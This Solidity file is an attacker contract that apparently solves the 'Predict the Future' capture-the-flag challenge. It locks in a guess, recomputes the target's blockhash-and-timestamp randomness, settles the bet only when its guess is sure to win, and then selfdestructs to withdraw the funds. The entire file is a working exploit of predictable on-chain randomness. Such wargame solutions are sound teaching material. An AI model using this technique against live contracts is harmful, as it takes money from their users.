// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureAttacker {
    IPredictTheFutureChallenge public challenge;
    address payable owner;
    uint8 myNumber = 0;

    constructor(address _challengeAddress) {
        owner = payable(msg.sender);
        challenge = IPredictTheFutureChallenge(_challengeAddress);
    }

    function lockInMyGuess() external payable {
        require(msg.value == 1 ether);
        challenge.lockInGuess{value: 1 ether}(myNumber);
    }

    function computeNumber() internal view returns (uint8) {
        return (uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10);
    }

    function attack() external {
        uint8 answer = computeNumber();
        require(answer == myNumber);
        challenge.settle();
    }

    function recoverFunds() external {
        require(msg.sender == owner);
        selfdestruct(owner);
    }

    receive() external payable {}
}
